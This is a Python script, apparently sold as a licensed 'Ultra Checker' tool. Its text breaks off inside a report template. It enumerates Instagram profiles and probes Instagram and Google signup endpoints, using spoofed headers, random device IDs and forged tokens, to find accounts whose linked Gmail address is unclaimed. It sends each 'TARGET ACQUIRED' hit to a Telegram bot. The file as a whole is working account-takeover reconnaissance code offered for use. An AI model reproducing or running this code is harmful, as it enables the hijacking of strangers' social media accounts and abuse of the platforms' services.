#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
⚡ 𝑼𝑳𝑻𝑹𝑨 𝑪𝑯𝑬𝑪𝑲𝑬𝑹 — 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑬𝑫𝑰𝑻𝑰𝑶𝑵 ⚡
"""

import sys
import os
import time
import random
import json
import re
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from collections import deque
from user_agent import generate_user_agent

# ============================================================
# 🔥 EXPIRY CHECK - 30 SEP 2026
# ============================================================
EXPIRY_DATE = datetime(2026, 9, 30, 23, 59, 59)

def check_expiry():
    current_date = datetime.now()
    if current_date > EXPIRY_DATE:
        print("\n" + "="*60)
        print("  ❌  YOUR LICENSE HAS EXPIRED!")
        print("  📅  Expiry Date: 30 September 2026")
        print("  📞  Contact: @SunrakuV2 for renewal")
        print("="*60 + "\n")
        sys.exit()
    
    days_left = (EXPIRY_DATE - current_date).days
    if days_left <= 3:
        print(f"\n⚠️  WARNING: License expires in {days_left} days!")
        print(f"📞  Contact @SunrakuV2 for renewal\n")

# ============================================================
# PREMIUM FONT
# ============================================================
def pf(text):
    bold_serif = {
        'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆',
        'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍',
        'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔',
        'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙'
    }
    small_caps = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
        'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ',
        'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ'
    }
    words = str(text).split(' ')
    result = []
    for word in words:
        if not word:
            result.append('')
            continue
        converted = []
        for i, char in enumerate(word):
            if i == 0:
                converted.append(bold_serif.get(char.upper(), char))
            else:
                converted.append(small_caps.get(char.lower(), char))
        result.append(''.join(converted))
    return ' '.join(result)

def _clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def _fmt_num(n):
    try:
        n = int(n)
        if n >= 1_000_000:
            return f"{n/1_000_000:.1f}M"
        if n >= 1_000:
            return f"{n/1_000:.1f}K"
        return str(n)
    except:
        return str(n)

# ============================================================
# CONFIGURATION
# ============================================================
THREADS = 80

# ============================================================
# COLORS
# ============================================================
GOLD = '\x1b[38;5;220m'
CYAN = '\x1b[38;5;51m'
PINK = '\x1b[38;5;213m'
GREEN = '\x1b[38;5;120m'
RED = '\x1b[38;5;196m'
YELLOW = '\x1b[38;5;226m'
WHITE = '\x1b[1;37m'
DIM = '\x1b[2;37m'
RESET = '\033[0m'
BOLD = '\x1b[1m'
PURPLE = '\x1b[38;5;141m'
ORANGE = '\x1b[38;5;208m'
NEON_GREEN = '\x1b[38;5;46m'
NEON_CYAN = '\x1b[38;5;87m'
DEEP_BLUE = '\x1b[38;5;27m'
HOT_PINK = '\x1b[38;5;205m'
CORAL = '\x1b[38;5;210m'
SKY = '\x1b[38;5;117m'
ROSE = '\x1b[38;5;203m'

# ============================================================
# 🔥 EXPIRY CHECK - FIRST
# ============================================================
check_expiry()

# ============================================================
# NEW BANNER
# ============================================================
_clr()
print(f"""{DEEP_BLUE}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║          ⚡  {pf('U L T R A')}  ⚡  {pf('C H E C K E R')}  ⚡               ║
    ║                                                           ║
    ║          ✦  {pf('PREMIUM EDITION v5.0')}  ✦                 ║
    ║          ✦  {pf('HYPER SCANNER ENGINE')}  ✦                   ║
    ║                                                           ║
    ║          🎯  {pf('ALL ACCOUNTS MODE')}  🎯                   ║
    ║          📅  {pf('EXPIRY: 30 SEP 2026')}  📅                 ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
{RESET}""")

# Show days left
days_left = (EXPIRY_DATE - datetime.now()).days
print(f'{GOLD}⚡ {pf("ULTRA CHECKER")} — {pf("HYPER MODE")} ⚡{RESET}')
print(f'{YELLOW}📅 {pf("License Valid For")}: {days_left} {pf("Days")}{RESET}')
print('')

chat_id = input(f'{CYAN}  📩 {pf("CHAT ID")} ➜ {RESET}')
print('')
bot_token = input(f'{CYAN}  🤖 {pf("BOT TOKEN")} ➜ {RESET}')
print('')
_clr()

# ============================================================
# STARTUP MESSAGE
# ============================================================
def startup_message(chat_id):
    days_left = (EXPIRY_DATE - datetime.now()).days
    return f"""
<b>╔═══════════════════════════════════════╗</b>
<b>║</b>   ⚡ <b>𝐄 𝐍 𝐆 𝐈 𝐍 𝐄  𝐎 𝐍 𝐋 𝐈 𝐍 𝐄</b> ⚡   <b>║</b>
<b>╚═══════════════════════════════════════╝</b>

<b>🔥 {pf('ULTRA CHECKER PREMIUM')} 🔥</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🎯 {pf('TARGET')}</b>      ➜  <code>{chat_id}</code>
<b>💎 {pf('STATUS')}</b>      ➜  <b>🟢 ONLINE</b>
<b>⚙️ {pf('ENGINE')}</b>      ➜  <b>🚀 HYPER</b>
<b>📊 {pf('MODE')}</b>        ➜  <b>🎯 ALL ACCOUNTS</b>
<b>📅 {pf('EXPIRY')}</b>      ➜  <b>30 SEP 2026</b>
<b>⏳ {pf('DAYS LEFT')}</b>   ➜  <b>{days_left} Days</b>
<b>🕒 {pf('STARTED')}</b>     ➜  <code>{datetime.now().strftime("%d-%m-%Y %H:%M:%S")}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>👑 {pf('OWNER')}</b>       ➜  <b>@SunrakuV2</b>
<b>📡 {pf('BROADCAST')}</b>   ➜  <b>t.me/Anishpy</b>

<b>⚡ {pf('HUNT BEGINS NOW')} ⚡</b>
"""

print(f"\n{CYAN}  📡 Connecting to Telegram...{RESET}")

try:
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": startup_message(chat_id),
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
        "reply_markup": json.dumps({
            "inline_keyboard": [
                [{"text": "👑 𝐎𝐖𝐍𝐄𝐑", "url": "https://t.me/SunrakuV2"}],
                [{"text": "📡 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓", "url": "https://t.me/Anishpy"}]
            ]
        })
    }
    r = requests.post(url, json=payload, timeout=10)
    if r.status_code == 200:
        print(f"{NEON_GREEN}  ✅ Connected! Engine online ~ ⚡{RESET}")
    else:
        print(f"{RED}  ⚠️ Connection failed: {r.status_code}{RESET}")
except Exception as e:
    print(f"{RED}  ⚠️ Error: {e}{RESET}")

print()
time.sleep(2)
_clr()

# Show banner again
print(f"""{DEEP_BLUE}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║          ⚡  {pf('U L T R A')}  ⚡  {pf('C H E C K E R')}  ⚡               ║
    ║                                                           ║
    ║          ✦  {pf('PREMIUM EDITION v5.0')}  ✦                 ║
    ║          ✦  {pf('HYPER SCANNER ENGINE')}  ✦                   ║
    ║                                                           ║
    ║          🎯  {pf('ALL ACCOUNTS MODE')}  🎯                   ║
    ║          📅  {pf('EXPIRY: 30 SEP 2026')}  📅                 ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
{RESET}""")
print(f'{GOLD}⚡ 𝐔𝐋𝐓𝐑𝐀 𝐄𝐍𝐆𝐈𝐍𝐄 𝐀𝐂𝐓𝐈𝐕𝐄.....{RESET}')

start_time = time.time()

# ============================================================
# STATS
# ============================================================
hits = 0
good = 0
bad = 0
ids_checked = 0
_session_start = time.time()
HIST_SIZE = 6
_hit_hist = deque(maxlen=HIST_SIZE)
_panel_lock = threading.Lock()
_panel_drawn = False
_PANEL_H = HIST_SIZE + 12

# ============================================================
# 🎨 NEW LIVE STATUS UI
# ============================================================
def _draw_panel(force=False):
    global _panel_drawn
    with _panel_lock:
        if _panel_drawn and not force:
            sys.stdout.write(f"\033[{_PANEL_H}A")
        
        elapsed = max(time.time() - _session_start, 1)
        rate_ids = ids_checked / elapsed
        elapsed_fmt = time.strftime('%H:%M:%S', time.gmtime(int(elapsed)))
        
        if rate_ids >= 1:
            rate_str = f"{NEON_GREEN}{rate_ids:.1f}{RESET}{DIM} /s{RESET}"
        else:
            rate_str = f"{SKY}{rate_ids * 60:.1f}{RESET}{DIM} /min{RESET}"
        
        # Days left
        days_left = (EXPIRY_DATE - datetime.now()).days
        
        # 🔥 NEW UI DESIGN
        print(f"\n{HOT_PINK}╔{'═'*62}╗{RESET}")
        print(f"{HOT_PINK}║{RESET}  {GOLD}◆{HOT_PINK}◆{GOLD}◆{RESET}  "
              f"{WHITE}{pf('ULTRA CHECKER')}{RESET}  "
              f"{GOLD}◆{HOT_PINK}◆{GOLD}◆{RESET}   "
              f"{DIM}v5.0{RESET}  {HOT_PINK}║{RESET}")
        print(f"{HOT_PINK}╠{'═'*62}╣{RESET}")
        
        # Row 1: HITS + GOOD
        print(f"{HOT_PINK}║{RESET}  "
              f"{NEON_GREEN}▰▰▰{RESET} {WHITE}HITS{RESET}       {NEON_GREEN}{hits:<6}{RESET}     "
              f"{NEON_CYAN}▰▰▰{RESET} {WHITE}GOOD{RESET}       {NEON_CYAN}{good:<6}{RESET}    "
              f"{HOT_PINK}║{RESET}")
        
        # Row 2: BAD + SCANNED
        print(f"{HOT_PINK}║{RESET}  "
              f"{RED}▰▰▰{RESET} {WHITE}BAD{RESET}        {RED}{bad:<6}{RESET}     "
              f"{GOLD}▰▰▰{RESET} {WHITE}SCANNED{RESET}    {GOLD}{ids_checked:<6}{RESET}    "
              f"{HOT_PINK}║{RESET}")
        
        print(f"{HOT_PINK}╠{'═'*62}╣{RESET}")
        
        # Rate + Uptime
        print(f"{HOT_PINK}║{RESET}  {PURPLE}⚡{RESET} {WHITE}RATE{RESET}     {rate_str:<20}  "
              f"{CORAL}⏱{RESET} {WHITE}UPTIME{RESET}  {CORAL}{elapsed_fmt}{RESET}  {HOT_PINK}║{RESET}")
        
        # Days Left
        print(f"{HOT_PINK}║{RESET}  {YELLOW}📅{RESET} {WHITE}EXPIRY{RESET}   {GOLD}30 SEP 2026{RESET}  "
              f"{DIM}({days_left} days left){RESET}  {HOT_PINK}║{RESET}")
        
        print(f"{HOT_PINK}╠{'═'*62}╣{RESET}")
        
        # Recent Hits Header
        print(f"{HOT_PINK}║{RESET}  {DIM}┌─────────────────────────────────────────────────┐{RESET}  {HOT_PINK}║{RESET}")
        print(f"{HOT_PINK}║{RESET}  {DIM}│{RESET}  {HOT_PINK}✦{RESET} {WHITE}LATEST CATCHES{RESET}                              {DIM}│{RESET}  {HOT_PINK}║{RESET}")
        print(f"{HOT_PINK}║{RESET}  {DIM}├─────────────────────────────────────────────────┤{RESET}  {HOT_PINK}║{RESET}")
        
        hist_list = list(_hit_hist)
        if not hist_list:
            print(f"{HOT_PINK}║{RESET}  {DIM}│{RESET}  {DIM}hunting in progress...{RESET}{' '*28}{DIM}│{RESET}  {HOT_PINK}║{RESET}")
        
        for entry in hist_list:
            uname, domain, followers, year, is_high = entry
            rank_icon = f"{GOLD}★{RESET}" if is_high else f"{NEON_CYAN}▸{RESET}"
            uname_col = f"{GOLD}" if is_high else f"{WHITE}"
            
            line = (f"  {DIM}│{RESET}  {rank_icon} {uname_col}@{uname:<14}{RESET} "
                    f"{NEON_CYAN}{domain:<9}{RESET} {NEON_GREEN}{_fmt_num(followers):<7}{RESET} "
                    f"{ROSE}{year}{RESET}  {DIM}│{RESET}")
            print(f"{HOT_PINK}║{RESET}{line}  {HOT_PINK}║{RESET}")
        
        for _ in range(HIST_SIZE - len(hist_list)):
            print(f"{HOT_PINK}║{RESET}  {DIM}│{RESET}{' '*49}{DIM}│{RESET}  {HOT_PINK}║{RESET}")
        
        print(f"{HOT_PINK}║{RESET}  {DIM}└─────────────────────────────────────────────────┘{RESET}  {HOT_PINK}║{RESET}")
        print(f"{HOT_PINK}╠{'═'*62}╣{RESET}")
        
        # Footer
        print(f"{HOT_PINK}║{RESET}  {NEON_GREEN}●{RESET} {WHITE}LIVE{RESET}       "
              f"{DIM}scanned {RESET}{WHITE}{ids_checked}{RESET} {DIM}accounts{RESET}     "
              f"{GOLD}👑 @SunrakuV2{RESET}           {HOT_PINK}║{RESET}")
        print(f"{HOT_PINK}╚{'═'*62}╝{RESET}")
        print(f"{DIM}  ⚡ {pf('ULTRA ENGINE')} — Hunting...{RESET}")
        
        sys.stdout.flush()
        _panel_drawn = True

def display(new_hit=None):
    if new_hit:
        _hit_hist.appendleft(new_hit)
    _draw_panel()

# ============================================================
# GOOGLE CHECKER
# ============================================================
class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(10, 30))
                    continue
            except:
                pass

            time.sleep(random.uniform(5, 15))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(3)
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                tl, host = line.split('//')

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': generate_user_agent(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        response = requests.post(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        )

        if '"gf.uar",1' in response.text:
            return 'good'
        elif '"er",null,null,null,null,400' in response.text:
            time.sleep(1)
            return self.check_availability(email)
        else:
            return 'bad'

# ============================================================
# INSTAGRAM CHECKER
# ============================================================
class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def _check_bloks(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            if f"{email}" in resp.text:
                return True
            else:
                return False
        except:
            return False

    def _check_web_create(self, email):
        if not self._ensure_tokens():
            return False
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-csrftoken': self.csrf,
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/'
        }
        cookies = {'csrftoken': self.csrf}
        username = 'testuser_' + str(random.randint(1000, 99999))
        data = {
            'email': email,
            'username': username,
            'first_name': 'Test',
            'password': 'Test@123456'
        }
        try:
            r = self.session.post(url, headers=headers, cookies=cookies, data=data, timeout=10)
            if r.status_code == 200:
                json_data = r.json()
                if 'email' in json_data.get('errors', {}):
                    return True
            return False
        except:
            return False

    def check_email(self, email):
        if self._check_bloks(email):
            return True
        if self._check_web_create(email):
            return True
        return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None

# ============================================================
# REPORT MANAGER
# ============================================================
class ReportManager:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self._telegram_working = True

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": msg,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
                "reply_markup": json.dumps({
                    "inline_keyboard": [
                        [{"text": "👑 𝐎𝐖𝐍𝐄𝐑", "url": "https://t.me/SunrakuV2"}],
                        [{"text": "📡 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓", "url": "https://t.me/Anishpy"}]
                    ]
                })
            }
            r = requests.post(url, json=payload, timeout=15)
            return r.status_code == 200
        except:
            return False

    def save_to_file(self, msg, filename='hits.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')

    def format_result(self, data):
        username = data.get('username', '')
        full_name = data.get('full_name', '')
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        domain = email.split('@')[1] if '@' in email else 'gmail.com'
        bio = data.get('biography', '')[:50]
        pk = data.get('pk', 0)
        
        try:
            pk = int(pk)
            year_ranges = [
                (1, 5000000, 2010), (5000001, 17750000, 2011),
                (17750001, 279760000, 2012), (279760001, 900990000, 2013),
                (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
            ]
            year = "2023+"
            for low, high, y in year_ranges:
                if low <= pk <= high:
                    year = str(y)
                    break
        except:
            year = "Unknown"

        is_verified = data.get('is_verified', False)
        is_private = data.get('is_private', False)
        
        verify_badge = "💠" if is_verified else "▫️"
        private_badge = "🔐" if is_private else "🔓"

        telegram_msg = f"""
<b>╔═══════════════════════════════════════╗</b>
<b>║</b>      🎯 <b>{pf('TARGET ACQUIRED')}</b> 🎯      <b>║</b>
<b>╚═══════════════════════════════════════╝</b>

<b>┌─ {pf('IDENTITY')} ────────────────┐</b>

<b>🧬 {pf('NAME')}</b>       ➜  <i>{full_name}</i> {verify_badge}
